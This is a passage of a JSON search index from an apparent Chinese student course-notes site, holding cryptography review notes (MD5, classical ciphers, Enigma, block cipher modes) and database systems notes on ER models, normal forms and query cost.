\u590d\u6742\u7684\u79fb\u4f4d\u4e0d\u8003\uff0c\u8003\u5bdf\u70b9\u5728\u4e8e\u5757\u8ba1\u7b97\uff08\u53d6\u591a\u957f\u7684\u5b57\u8282\uff0c\u7ed3\u679c\u591a\u5c11\u5b57\u8282\uff09\uff0c\u4f4d\u8865\u5145</li> <li>rc4, ecb, cbc, cfb<ul> <li>rc4\u4e86\u89e3\u57fa\u672c\u539f\u7406</li> <li>ecb\u52a0\u5bc6\u8fc7\u7a0b\u3001\u4f18\u70b9\u7f3a\u70b9</li> <li>cbc\u52a0\u5bc6\u8fc7\u7a0b</li> <li>cfb\u52a0\u5bc6\u8fc7\u7a0b\uff08\u9700\u8981\u4e86\u89e3\u8be6\u7ec6\u8fc7\u7a0b\uff09</li> </ul> </li> <li>des<ul> <li>\u52a0\u5bc6\u6d41\u7a0b</li> <li>sbox\u67e5\u8be2\u8fc7\u7a0b</li> </ul> </li> <li>aes<ul> <li>\u8003\u5bdf\u91cd\u70b9mixcolumn<ul> <li>\u5982\u4f55\u505a\u4e24\u4e2a\u516b\u4f4d\u7684\u4e58\u6cd5\uff1f\uff08\u519c\u592b\u7b97\u6cd5\uff09</li> <li>\u77e9\u9635\u7684\u8ba1\u7b97\uff1f</li> </ul> </li> <li>\u4e09\u79cd\u52a0\u5bc6\u89c4\u6a21\uff1a\u5bc6\u94a5\u751f\u6210\u8fc7\u7a0b<ul> <li>128-&gt;10\u8f6e</li> <li>192-&gt;12\u8f6e</li> <li>254-&gt;14\u8f6e</li> </ul> </li> </ul> </li> <li>rsa<ul> <li>rsa\u8bc1\u660e</li> <li>\u52a0\u5bc6\u8fc7\u7a0b</li> <li>rsa\u6e90\u4ee3\u7801(openssl\u7528\u6cd5)</li> </ul> </li> <li>ecc<ul> <li>\u70b9\u52a0\u6cd5\u3001\u70b9\u4e58\u6cd5\uff08\u5faa\u73af\u5b50\u7fa4\uff09</li> <li>\u4e00\u79cd\u52a0\u89e3\u5bc6\u7b97\u6cd5\u3001\u4e24\u79cd\u7b7e\u540d\u7b97\u6cd5</li> <li>ecc\u6e90\u4ee3\u7801</li> </ul> </li> <li>\u77e5\u9053openssl\u51fd\u6570\u7684\u7528\u9014\u3001\u53c2\u6570\u7684\u542b\u4e49<ul> <li>RSA \u4e58\u65b9\u3001\u6c42\u6a21</li> <li>ECC \u70b9\u7684\u8bbe\u7f6e</li> <li>...</li> </ul> </li> </ul>"},{"location":"course/crypto/md5/","title":"MD5","text":"<p>MD5\u662f\u5c06\u660e\u6587\u5904\u7406\u621016byte\u7684\u54c8\u5e0c\u6458\u8981</p>"},{"location":"course/crypto/md5/#_1","title":"\u7528\u9014","text":"<p>md5\u5e38\u4e0e\u5176\u4ed6\u7b97\u6cd5\u7ed3\u5408\uff0c\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\uff0c\u5982\u90ae\u4ef6\u53d1\u9001</p>"},{"location":"course/crypto/md5/#_2","title":"\u52a0\u5bc6\u8fc7\u7a0b","text":"\\[ \\begin{aligned} \\rm m&amp;={\\rm md5}(letter)\\\\ \\rm m'&amp;={\\rm rsa}(m,\\rm private\\ key) \\end{aligned} \\]"},{"location":"course/crypto/md5/#_3","title":"\u68c0\u9a8c\u8fc7\u7a0b","text":"\\[ \\begin{aligned} \\rm md5(letter) == \\rm rsa(m', public\\ key)\\\\ \\end{aligned} \\]"},{"location":"course/crypto/md5/#_4","title":"\u5b9e\u73b0","text":""},{"location":"course/crypto/md5/#_5","title":"\u7ed3\u6784\u4f53\u5b9a\u4e49","text":"<pre><code>typedef struct _MD5_CTX\n{\n    unsigned long state[4];\n    unsigned long count[2]; /* \u5df2\u5904\u7406\u7684\u62a5\u6587\u7684\u4e8c\u8fdb\u5236\u4f4d\u6570,\u6700\u5927\u503c=2^64-1 */\n    unsigned char data[4];  /* 64\u5b57\u8282message\u5757 */\n}\n</code></pre>"},{"location":"course/crypto/md5/#init","title":"Init","text":"<p>\u5bf9state\u8d4b\u521d\u59cb\u503c\uff0c\u6e05\u7a7acount</p>"},{"location":"course/crypto/md5/#update","title":"Update","text":"<p>\u6bcf64\u4e2a\u5b57\u8282\u4e3a\u4e00\u7ec4\uff0c\u8fdb\u884c\u5904\u7406\u66f4\u65b0</p>"},{"location":"course/crypto/md5/#final","title":"Final","text":"<p>\u56e0\u4e3a\u4e0d\u662f\u6240\u6709\u7684\u660e\u6587\u90fd\u662f64\u5b57\u8282\u7684\u500d\u6570\uff0c\u6240\u4ee5\u9700\u8981\u5bf9\u7f3a\u5931\u7684\u5185\u5bb9\u8fdb\u884c\u8865\u5145\uff0c\u8865\u5145\u7684\u5185\u5bb9\u5305\u62ec\u586b\u5145\u7269\u548c\u660e\u6587\u957f\u5ea6</p> <ul> <li>\u586b\u5145\u7269   0x80, 0x00, 0x00, ..., 0x00</li> <li>\u89c4\u5219</li> </ul>"},{"location":"course/crypto/md5/#_6","title":"\u7834\u89e3","text":"<p>MD5\u7684\u7834\u89e3\u5173\u952e\u5728\u4e8e\u627e\u5230Collision</p>"},{"location":"course/crypto/md5/#collision","title":"Collision","text":"<p>\\({\\rm md5}(x)={\\rm md5}(x') \\ \\ (x\\ne x')\\)</p>"},{"location":"course/crypto/md5/#rainbow-table","title":"rainbow table","text":"<p>\u4e00\u79cd\u8f83\u5f31\u7684MD5\u7834\u89e3\u65b9\u6cd5\uff0c\u5173\u952e\u5728\u4e8e\u9884\u8ba1\u7b97</p> <ul> <li>\u627eN\u7ec4\u6570\u636e</li> <li>\u5bf9N\u7ec4\u6570\u636e\u5206\u522b\u4f7f\u7528MD5\u5904\u7406K\u8f6e</li> <li>\u5bf9\u76ee\u6807\u6570X\u8fdb\u884cMD5\u5904\u7406\uff0c\u5e76\u5c06\u7ed3\u679c\u4e0eN\u4e2a(\u5904\u7406K\u8f6e\u540e\u7684)\u7ed3\u679c\u8fdb\u884c\u6bd4\u8f83</li> <li>\u82e5X\u4e0e\u5176\u4e2d\u67d0\u4e2a\u6570\u76f8\u7b49\uff0c\u5219\u6839\u636eX\u88abMD5\u5904\u7406\u7684\u8f6e\u6570\u5373\u53ef\u5012\u63a8\u51faCollision</li> <li>\u5426\u5219\u7ee7\u7eed\u5bf9X\u8fdb\u884cMD5\u5904\u7406</li> </ul>"},{"location":"course/crypto/old/","title":"\u53e4\u5178\u5bc6\u7801","text":"<p>Info</p> <ul> <li>2022/6/14 \u4fee\u6539Enigma\u52a0\u5bc6\u6d41\u7a0b\u56fe</li> <li>2022/6/14 \u6dfb\u52a0double stepping\u793a\u610f\u56fe</li> </ul>"},{"location":"course/crypto/old/#_2","title":"\u5355\u8868\u5bc6\u7801","text":"<ul> <li>\u4f7f\u7528\u660e\u6587\u5bc6\u6587\u5bf9\u7167\u8868</li> </ul>"},{"location":"course/crypto/old/#_3","title":"\u4eff\u5c04\u5bc6\u7801","text":"<p>\\(x = (y \\times k_1+k_2 )\\%n\\) \\(y = (x-k_2)\\times k^{-1} \\%n\\)</p>"},{"location":"course/crypto/old/#_4","title":"\u591a\u8868\u5bc6\u7801","text":"<p>\u6bcf\u4e2a\u660e\u6587\u5b57\u6bcd\u91c7\u7528\u4e0d\u540c\u7684\u5355\u8868\u66ff\u6362\uff08\u540c\u4e00\u660e\u6587\u5b57\u6bcd\u5bf9\u5e94\u591a\u4e2a\u5bc6\u6587\u5b57\u7b26\uff09</p>"},{"location":"course/crypto/old/#vigenere-algorithm","title":"Vigenere Algorithm","text":"<pre><code>\u660e\u6587: this cryptto system is not secure\n\u5bc6\u94a5: cipher cipher cipher cipher cipher\n\u5bc6\u6587: VPXZGIA...\nt+c = v\nt+p = i\n</code></pre>"},{"location":"course/crypto/old/#enigma","title":"Enigma","text":"<pre><code>Date: \u6bcf\u4e00\u5929\u7684\u5bc6\u7801\u8bbe\u8ba1\nRingstellung (delta)\u6dfb\u52a0\u589e\u91cf\nSteckerverbindungen: \u5341\u5bf9\u5b57\u6bcd\u7684\u76f8\u4e92\u8f6c\u5316\nKenngrunppen: \u548c\u65e5\u671f\u5bf9\u5e94 \u65b9\u4fbf\u60c5\u62a5\u5f52\u7c7b\n</code></pre>"},{"location":"course/crypto/old/#_5","title":"\u90e8\u4ef6\u4e0e\u6982\u5ff5","text":"<ul> <li>rotor1\uff0c\u5b57\u6bcd\u88681</li> <li>rotor2\uff0c\u5b57\u6bcd\u88682</li> <li>rotor3\uff0c\u5b57\u6bcd\u88683</li> <li>reflactor\uff0c\u5b57\u6bcd\u4e24\u4e24\u5bf9\u5e94</li> <li>wiring board\uff0c\u8fde\u63a5\u5bf9\u5e94\u5b57\u6bcd</li> <li>message key\uff0c\u4e09\u4e2arotor\u5916\u9762\u7684\u663e\u793a\uff0c\u5916\u90e8delta</li> <li>ring setting\uff0c\u4e09\u4e2arotor\u5185\u90e8\u7684\u8bbe\u7f6e\uff0c\u5185\u90e8delta</li> <li>delta = message key - ring setting</li> </ul>"},{"location":"course/crypto/old/#_6","title":"\u5177\u4f53\u52a0\u5bc6\u6d41\u7a0b","text":"<pre><code>plaintext -&gt; wiring board \n          -&gt; +delta1 -&gt; rotor1 -&gt; -delta1\n          -&gt; +delta2 -&gt; rotor2 -&gt; -delta2\n          -&gt; +delta3 -&gt; rotor3 -&gt; -delta3\n          -&gt; reflactor \n          -&gt; +delta3 -&gt; rotor3 -&gt; -delta3\n          -&gt; +delta2 -&gt; rotor2 -&gt; -delta2\n          -&gt; +delta1 -&gt; rotor3 -&gt; -delta1 \n          -&gt; wiring board \n                                -&gt; cripertext\n</code></pre> <p>\u540c\u7406\u53ef\u77e5\u52a0\u5bc6\u3001\u89e3\u5bc6\u662f\u5b8c\u5168\u53ef\u9006\u7684\u8fc7\u7a0b  </p>"},{"location":"course/crypto/old/#_7","title":"\u9f7f\u8f6e\u8df3\u8f6c\u89c4\u5219","text":"<p>QEVJZ RFWKA  </p> <ol> <li>\u5e38\u89c4\u8df3\u8f6c<ul> <li>\u6bcf\u6309\u4e00\u4e0b\uff0c\u9f7f\u8f6eI\u8df3\u8f6c\u4e00\u4e0b</li> <li>\u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c\u4e00\u4e0b</li> </ul> </li> <li>double stepping<ul> <li>\u5f53\u9f7f\u8f6eI\u4ece\u4f4d\u7f6eQ\u8f6c\u5230R\u65f6\uff0c\u9f7f\u8f6e\u2161\u88ab\u5e26\u52a8\u8df3\u8f6c</li> <li>\u82e5\u6b64\u65f6\u9f7f\u8f6e\u2161\u662f\u4eceD\u8df3\u8f6c\u5230E\uff0c\u5219\u4e0b\u4e00\u6b21\u9f7f\u8f6e\u2161\u4eceE\u8df3\u8f6c\u5230F\uff0c\u5e76\u5e26\u52a8\u9f7f\u8f6e\u2162\u8df3\u8f6c</li> <li>\u53ef\u4ee5\u7406\u89e3\u4e3a I=Q,\u2161=D,\u2162=X -&gt; I=R,\u2161=E,\u2162=X -&gt; I=S,\u2161=F,\u2162=X+1</li> <li></li> </ul> </li> </ol>"},{"location":"course/crypto/rc4/","title":"\u5206\u7ec4\u5bc6\u7801\u5de5\u4f5c\u6a21\u5f0f\u4e0e\u6d41\u5bc6\u7801","text":""},{"location":"course/crypto/rc4/#1-ecb","title":"1. \u7535\u5b50\u5bc6\u7801\u7c3f\u6a21\u5f0f ECB","text":"<p>Electronic codebook mode\uff0c\u5c06\u660e\u6587\u62c6\u5206\u6210\u82e5\u5e72\u6bb5\uff0c\u5206\u522b\u52a0\u5bc6\u3002</p> <ul> <li>ECB\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff1a\\(C_j = E_k(P_j)\\)</li> <li>ECB\u7684\u89e3\u5bc6\u8fc7\u7a0b\uff1a\\(P_j = D_k(C_j)\\)</li> <li>ECB\u7684\u7f3a\u70b9\uff1a\u540c\u6837\u5185\u5bb9\u7684\u660e\u6587\u6bb5\uff0c\u52a0\u5bc6\u7ed3\u679c\u603b\u662f\u76f8\u540c\uff0c\u5bb9\u6613\u88ab\u653b\u7834</li> <li>ECB\u7684\u4f18\u70b9\uff1a\u52a0\u5bc6\u548c\u89e3\u5bc6\u8fc7\u7a0b\u5747\u53ef\u5e76\u884c</li> </ul>"},{"location":"course/crypto/rc4/#2-cbc","title":"2. \u5bc6\u6587\u5757\u94fe\u63a5\u6a21\u5f0f CBC","text":"<p>Cipher Block Chaining Mode\uff0c\u52a0\u5bc6\u8fc7\u7a0b\u5982\u4e0b\uff0c\u6bcf\u6b21\u52a0\u5bc6\u90fd\u4f9d\u8d56\u4e0a\u4e00\u6b21\u7684\u5bc6\u6587\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002 </p> <ul> <li>CBC\u7f3a\u70b9\uff1a\u52a0\u5bc6\u8fc7\u7a0b\u53ea\u80fd\u4e32\u884c</li> <li>CBC\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u4e14\u89e3\u5bc6\u8fc7\u7a0b\u53ef\u4ee5\u5e76\u884c</li> </ul>"},{"location":"course/crypto/rc4/#3-cfb","title":"3. \u5bc6\u6587\u53cd\u9988\u6a21\u5f0f CFB","text":"<p>Cipher feedback mode \u53ef\u4ee5\u8bbe\u7f6e\u4f4d\u79fb\u6b65\u957f\uff08\u5f53\u6b65\u957f\u4e3a\u4e00\u7ec4\u7684\u957f\u5ea6\u65f6\uff0c\u7b97\u6cd5\u7ea6\u7b49\u4e8eCBC\uff09\uff0c\u7ec4\u4e0e\u7ec4\u4e4b\u95f4\u7406\u8bba\u4e0a\u5b58\u5728\u76f8\u4e92\u5370\u8bc1\u5173\u7cfb\uff0c\u4f7f\u5f97\u5176\u5728\u5bc6\u6587\u4f20\u8f93\u4e2d\u82e5\u4ea7\u751f\u9519\u8bef\uff0c\u4e5f\u53ea\u4f1a\u5f71\u54cd\u90e8\u5206\u6570\u636e\u3002</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cECB\u7684\u52a0\u5bc6\u5757\u5927\u5c0f\u4e3a8byte\uff0c\u800cCFB\u91c7\u75281byte\u3002\u52a0\u5bc6\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\u3002\u5176\u4e2dP\u4e3a\u660e\u6587(P1,P2...Pn)\uff0cC\u4e3a\u5bc6\u6587\uff0cEk\u4e3a\u4ee5k\u4e3a\u5bc6\u94a5\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0cX1\u4e3a\u521d\u59cb </p> <ul> <li>CFB\u4f18\u70b9\uff1a\u76f8\u8f83ECB\u66f4\u4e3a\u5b89\u5168\uff0c\u53ef\u4ee5\u4ece\u4f20\u8f93\u7684\u5bc6\u6587\u9519\u8bef\u4e2d\u6062\u590d\u3002</li> </ul>"},{"location":"course/crypto/rc4/#4-rc4","title":"4. \u6d41\u5bc6\u7801\u7b97\u6cd5 RC4","text":""},{"location":"course/db/","title":"\u6570\u636e\u5e93\u7cfb\u7edf(2021-2022\u6625\u590f)","text":""},{"location":"course/db/#introduction","title":"Introduction","text":"<p>\u4e0a\u7684\u662f\u9ad8\u4e91\u541b\u8001\u5e08\u7684\u6570\u636e\u5e93\u7cfb\u7edf\u8bfe\u7a0b\u3002 \u672c\u8bfe\u7a0b\u5408\u5e76\u4e86\u6570\u636e\u5e93\u7cfb\u7edf\u6982\u5ff5\u53ca\u6570\u636e\u5e93\u7cfb\u7edf\u8bbe\u8ba1\u7684\u5185\u5bb9\u3002 \u56e0\u4e3a\u7ed3\u5408\u4e86\u4e0a\u8bfe\u7684\u82f1\u6587\u7b14\u8bb0\u4ee5\u53ca\u671f\u672b\u590d\u4e60\u7684\u4e2d\u6587\u63d0\u7eb2\uff0c\u5f88\u591a\u5730\u65b9\u90fd\u662f\u4e2d\u82f1\u6587\u6df7\u5408\u6392\u7248\u3002\uff08\u8fd8\u662f\u592a\u61d2\u7684\u7f18\u6545\uff09  </p> <p>\u5982\u679c\u4f60\u6b63\u5728\u4e0a\u8fd9\u95e8\u8bfe\u7a0b\uff0c\u5e76\u5728\u8fdb\u884c\u671f\u672b\u590d\u4e60\uff0c\u6709\u4ee5\u4e0b\u63a8\u8350\u7684\u590d\u4e60\u8def\u7ebf\uff1a</p> <ol> <li>\u542c\u8001\u5e08\u7684\u590d\u4e60\u8bfe\u56de\u653e\uff0c\u5212\u590d\u4e60\u91cd\u70b9</li> <li>\u8ddf\u7740\u5f80\u5c4a\u7684\u590d\u4e60\u7b14\u8bb0+\u8001\u5e08\u7684\u8bfe\u4ef6\u590d\u4e60</li> <li>\u628a\u590d\u4e60\u5185\u5bb9\u6284\u5230cheating paper\u4e0a\uff0c\u5e76\u8fb9\u5237\u9898\u8fb9\u8865\u5145</li> <li>\u518d\u542c\u4e00\u904d\u56de\u653e\uff0c\u67e5\u6f0f\u8865\u7f3a\uff08\u8fd9\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u6b64\u65f6\u4f60\u5bf9\u6574\u4f53\u7684\u77e5\u8bc6\u8109\u7edc\u5df2\u7ecf\u6709\u4e86\u638c\u63e1\uff0c\u80fd\u771f\u6b63\u542c\u61c2\u8001\u5e08\u5728\u201c\u63d0\u793a\u201d\u4ec0\u4e48\uff09</li> </ol>"},{"location":"course/db/#references","title":"References","text":"<ul> <li>\u5b59\u5efa\u4f36\u8001\u5e08\u7684\u8bfe\u4ef6</li> <li>\u5c0f\u89d2\u9f99\u5b66\u957f\u7684\u7b14\u8bb0</li> <li>RandomStar\u5b66\u957f\u7684\u7b14\u8bb0</li> </ul>"},{"location":"course/db/ER/","title":"E-R Model and Normal Form","text":""},{"location":"course/db/ER/#e-r-model","title":"E-R Model","text":""},{"location":"course/db/ER/#basic-concepts","title":"Basic Concepts","text":"<ul> <li>Entity: The set of permitted values for each attributes</li> <li>Relation: A relationship is an association among several entities.</li> <li>Weak entity sets: An entity that does not have a primary key is referred to as a weak entity set.</li> <li>constraints \u7ea6\u675f<ul> <li>mapping cardinalities \u6620\u5c04\u57fa\u6570<ul> <li>one-to-one</li> <li>one-to-many</li> <li>many-to-one</li> <li>many-to-many</li> </ul> </li> <li>\u53c2\u4e0e\u5ea6\u7ea6\u675f<ul> <li>total participation</li> <li>partial participation</li> </ul> </li> <li>key\u7ea6\u675f</li> </ul> </li> <li>specialization(\u7279\u6b8a\u5316) &amp; generalization(\u6cdb\u5316):</li> <li>converting Non-Binary Relationships to Binary Form</li> </ul>"},{"location":"course/db/ER/#summary-of-symbols","title":"Summary of Symbols","text":""},{"location":"course/db/ER/#reduction-of-an-e-r-schema-to-tables","title":"Reduction of an E-R  Schema to Tables","text":"<p>(1) Representing Relationshp Sets as Tables (2) Representing Weak Entity Sets (3) Redundancy of Tables  1&gt; Many-to-one/one-to-many -&gt; relationship sets add to \"many\" side 2&gt; one-to-one -&gt; relationship sets add to any side (4) Representing Specialization as Tables  </p>"},{"location":"course/db/ER/#normal-form","title":"Normal Form","text":""},{"location":"course/db/ER/#_1","title":"\u57fa\u672c\u6982\u5ff5","text":"<ul> <li>\u5206\u89e3<ul> <li>\u6709\u635f\u5206\u89e3(Lossy Decomposition): \u4e0d\u80fd\u7528\u5206\u89e3\u540e\u7684\u51e0\u4e2a\u5173\u7cfb\u91cd\u5efa\u539f\u672c\u7684\u5173\u7cfb\uff0c\u53cd\u4e4b\u4e3a\u65e0\u635f\u5206\u89e3\u3002</li> <li>\u65e0\u635f\u5206\u89e3(Lossless Decomposition): \\(R_1\\cap R_2\\)\u662f\\(R_1\\)\u6216\\(R_2\\)\u7684\u8d85\u7801\uff08\u5145\u8981\u6761\u4ef6\uff09</li> </ul> </li> <li>\u51fd\u6570\u4f9d\u8d56: \u5bf9\u4e8e\u4efb\u4f55\u4e00\u4e2a\u4e00\u4e2a\u5173\u7cfb\\(R\\)\uff0c\u82e5\\(\\alpha \\in R,\\beta \\in R\\)\uff0c\u4e14\u7531\\(R\\)\u4e2d\u4e24\u4e2a\u5143\u7ec4\\(t_1,t_2\\)\u4e2d\u7684\\(\\alpha\\)\u5c5e\u6027\u503c\u76f8\u540c\u53ef\u4ee5\u5f97\u51fa\u5176\\(\\beta\\)\u5c5e\u6027\u503c\u76f8\u540c\uff0c\u5219\u79f0\\(\\alpha\\to \\beta\\)\u662f\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\uff0c\u5373\\(\\alpha\\)\u53ef\u4ee5\u552f\u4e00\u6807\u8bc6/\u51b3\u5b9a\\(\\beta\\)\u3002\u82e5\\(R\\)\u4e2d\u7684\u6bcf\u4e2a\u5143\u7ec4\u90fd\u6ee1\u8db3\u51fd\u6570\u4f9d\u8d56\uff0c\u5219\u79f0\u51fd\u6570\u4f9d\u8d56\u5728\\(R\\)\u4e0a\u6210\u7acb\u3002<ul> <li>\u5e73\u51e1\u7684\u51fd\u6570\u4f9d\u8d56\uff1a\\(\\alpha \\subset \\beta\\) \u63a8\u51fa \\(\\beta \\to \\alpha\\)</li> <li>\\(K\\)\u662f\\(R\\)\u7684\u8d85\u7801\\(\\iff K\\to R\\)</li> </ul> </li> <li>\u95ed\u5305\uff1a\u7531\u7ed9\u5b9a\u7684\u51fd\u6570\u4f9d\u8d56\\(F\\)\u6240\u80fd\u63a8\u5bfc\u51fa\u7684\u6240\u6709\u51fd\u6570\u4f9d\u8d56\u6784\u6210\u7684\u96c6\u5408\\(F^{+}\\)<ul> <li>Armstrong\u516c\u7406</li> <li>\u5c5e\u6027\u96c6\u95ed\u5305\uff1a\u67d0\u5c5e\u6027\u6240\u80fd\u552f\u4e00\u51b3\u5b9a\u7684\u5c5e\u6027\u7684\u96c6\u5408</li> </ul> </li> <li>\u65e0\u5173\u5c5e\u6027\uff1a\u5982\u679c\u53bb\u9664\u51fd\u6570\u4f9d\u8d56\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u4e0d\u4f1a\u6539\u53d8\u8fd9\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\u7684\u95ed\u5305\uff0c\u5219\u79f0\u8be5\u5c5e\u6027\u662f\u65e0\u5173\u7684\u3002</li> <li>\u6700\u5c0f\u8986\u76d6\uff1a\u6700\u5c0f\u8986\u76d6\\(F_c\\)\u5fc5\u987b\u6ee1\u8db3\uff081\uff09\\(F_c\\)\u4e2d\u4efb\u4f55\u51fd\u6570\u4f9d\u8d56\u4e0d\u542b\u65e0\u5173\u5c5e\u6027\u3002(2) \\(F_c\\)\u4e2d\u4efb\u4f55\u51fd\u6570\u5de6\u534a\u90e8\u5206\u552f\u4e00</li> <li>\u5bfb\u627e\u6700\u5c0f\u8986\u76d6\u7684\u65b9\u6cd5<ul> <li>\u4ee4\\(F_c=F\\).</li> <li>\u5229\u7528\u5408\u5e76\u5f8b\u5c06\u6240\u6709\\(\\alpha\\to\\beta_1,\\alpha\\to\\beta_2,\\dots\\)\u5408\u5e76\u4e3a\\(\\alpha\\to\\beta_1\\beta_2...\\)</li> <li>\u5728\\(F_c\\)\u4e2d\u5bfb\u627e\u4e00\u4e2a\u5177\u6709\u65e0\u5173\u5c5e\u6027\u7684\u51fd\u6570\u4f9d\u8d56\uff0c\u5e76\u5220\u9664\u8be5\u65e0\u5173\u5c5e\u6027\u3002</li> <li>\u91cd\u590d\u4e0a\u8ff0\u6b65\u9aa4\u76f4\u81f3\\(F_c\\)\u4e0d\u53d8</li> </ul> </li> <li>\u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\uff1a\u4ee4\\(F\\)\u4e3a\\(R\\)\u4e0a\u7684\u4e00\u4e2a\u51fd\u6570\u4f9d\u8d56\u96c6\uff0c\\(R_1,R_2,\\dots,R_n\\)\u662f\\(R\\)\u7684\u5206\u89e3\uff0c\u7528\\(F_i\\)\u8868\u793a\u53ea\u5305\u542b\\(R_i\\)\u4e2d\u51fa\u73b0\u7684\u5143\u7d20\u7684\u51fd\u6570\u4f9d\u8d56\u7684\u96c6\u5408\uff0c\u82e5\\((F_1\\cup F_2\\cup\\dots\\cup F_n)^{+}=F^{+}\\)\uff0c\u5219\u8be5\u5206\u89e3\u4e3a\u4f9d\u8d56\u4fdd\u6301\u5206\u89e3\u3002</li> </ul>"},{"location":"course/db/ER/#_2","title":"\u7b2c\u4e00\u8303\u5f0f","text":"<p>\u6240\u6709\u5c5e\u6027\u90fd\u662f\u539f\u5b50\u7684(atomic)\uff0c\u5373\u4e0d\u53ef\u518d\u7ec6\u5206\u7684\u3002</p>"},{"location":"course/db/ER/#bc","title":"BC\u8303\u5f0f","text":"<ul> <li>Boyce-Codd Normal Form</li> <li>\u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56\\(\\alpha\\to\\beta\\)\u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879<ul> <li>\\(\\alpha\\to\\beta\\)\u662f\u5e73\u51e1\u7684</li> <li>\\(\\alpha\\)\u662f\\(R\\)\u7684\u4e00\u4e2a\u8d85\u7801</li> </ul> </li> <li>\u5224\u65ad\u51fd\u6570\u4f9d\u8d56\\(\\alpha\\to\\beta\\)\u662f\u5426\u8fdd\u53cd\u4e86BCNF\uff1a\u8ba1\u7b97\\(\\alpha^{+}\\)\uff0c\u82e5\u5176\u65e2\u4e0d\u662f\\(\\beta\\)(\u5e73\u51e1\u7684)\uff0c\u4e5f\u4e0d\u662f\u6240\u6709\u5143\u7d20\u7684\u96c6\u5408(\u4e0d\u662f\u8d85\u7801)\uff0c\u5219\u4e0d\u662fBCNF</li> <li>BCNF\u5206\u89e3\uff08\u540c\u65f6\u4e5f\u662f\u65e0\u635f\u5206\u89e3\uff09<ul> <li>Suppose we have a schema R and a non-trivial dependency \\(\\alpha \\to \\beta\\) causes a violation of BCNF.We decompose R into: \\((\\alpha \\cup \\beta)\\) and \\((R-(\\beta-\\alpha))\\)</li> </ul> </li> </ul>"},{"location":"course/db/ER/#_3","title":"\u7b2c\u4e09\u8303\u5f0f","text":"<ul> <li>3rd Normal Form</li> <li>\u6027\u8d28\uff1a\u4efb\u610f\u51fd\u6570\u4f9d\u8d56\\(\\alpha\\to\\beta\\)\u81f3\u5c11\u6ee1\u8db3\u4e0b\u9762\u4efb\u610f\u4e00\u9879<ul> <li>\\(\\alpha\\to\\beta\\)\u662f\u5e73\u51e1\u7684</li> <li>\\(\\alpha\\)\u662f\\(R\\)\u7684\u4e00\u4e2a\u8d85\u7801</li> <li>\\(\\beta-\\alpha\\)\u4e2d\u7684\u6bcf\u4e2a\u5c5e\u6027A\u90fd\u5305\u542b\u4e8e\\(R\\)\u7684\u5019\u9009\u7801\u4e2d</li> </ul> </li> <li>\u4efb\u4f55BCNF\u8303\u5f0f\u90fd\u662f3NF\u8303\u5f0f</li> <li>3NF\u5206\u89e3</li> <li>\u76f8\u6bd4\u4e4b\u4e0b\uff0c3NF\u5206\u89e3\u53ef\u4ee5\u4fdd\u8bc1\u4f9d\u8d56\u4fdd\u6301\uff0c\u800cBCNF\u4e0d\u4e00\u5b9a</li> <li>BCNF\u548c3NF\u90fd\u80fd\u4fdd\u8bc1\u65e0\u635f\u5206\u89e3</li> </ul>"},{"location":"course/db/ER/#reference","title":"Reference","text":"<ul> <li>\u5206\u89e3\u4e09\u8303\u5f0f+BC\u8303\u5f0f</li> </ul>"},{"location":"course/db/query/","title":"Query Processing &amp; Optimization","text":"<p>\u67e5\u8be2\u5904\u7406\u5171\u5206\u4e3a\u4e09\u4e2a\u8fc7\u7a0b\uff1a\u6267\u884c(Parsing &amp; Translation)\u3001\u4f18\u5316(Optimization)\u3001\u4f30\u8ba1(Evaluation)</p>"},{"location":"course/db/query/#parsing-translation","title":"Parsing &amp; Translation","text":""},{"location":"course/db/query/#measures-of-query-cost","title":"Measures of Query Cost","text":"<ul> <li>\\(t_T\\): time to transfer one block</li> <li>\\(t_S\\): time for one seek</li> <li>Cost for b block transfers plus S seeks: \\(b*t_T + S*t_S\\)</li> </ul>"},{"location":"course/db/query/#selection","title":"Selection","text":"<ul> <li>Linear Search(equality on key): \u7ebf\u6027\u641c\u7d22<ul> <li>worst cost: \\(b_r * t_T + t_S\\) (\u5173\u7cfb\u8868\u5b58\u653e\u5728\\(b_r\\)\u4e2ablock\u4e2d)</li> <li>average cost: \\((b_r/2)*t_T + t_S\\) (\u5728\u67e5\u8be2\u503c\u4e3a\u4e3b\u7801\u7684\u60c5\u51b5\u4e0b)</li> </ul> </li> <li>Primary B+-Tree index(equality on key): B+\u6811\u4e3b\u7d22\u5f15\u641c\u7d22<ul> <li>Cost: \\((h_i+1)*(t_T+t_S)\\)\uff0c\\(h_i\\)\u662fB+\u6811\u7684\u9ad8\u5ea6\uff0c\u6bcf\u6b21\u9700\u8981\u4eceDisk\u4e2dSeek\u8be5\u5757\u5e76\u8bfb\u5165\uff0c\u800c\u540e\u9762\u76841\u662f\u6307\u6700\u540e\u627e\u5230\u76ee\u6807\u5757\u65f6\uff0c\u9700\u8981\u8fdb\u884cseek+transfer(\u4f7f\u7528Index\u5fc5\u4e0d\u53ef\u5c11\u7684)</li> </ul> </li> <li>Primary B+-Tree index(equality on nonkey): B+\u6811\u4e3b\u7d22\u5f15\uff0c\u5355\u503c(\u975e\u552f\u4e00)<ul> <li>Cost: \\(h_i*(t_T+t_S)+t_S+b*t_T\\)\uff0c\u5176\u4e2db\u662f\u5305\u542b\u67e5\u627e\u503c\u7684\u6570\u636e\u5757\u4e2a\u6570\u3002</li> </ul> </li> <li>Secondary B+-Tree index(equality on key): B+\u6811\u8f85\u52a9\u7d22\u5f15<ul> <li>Cost: 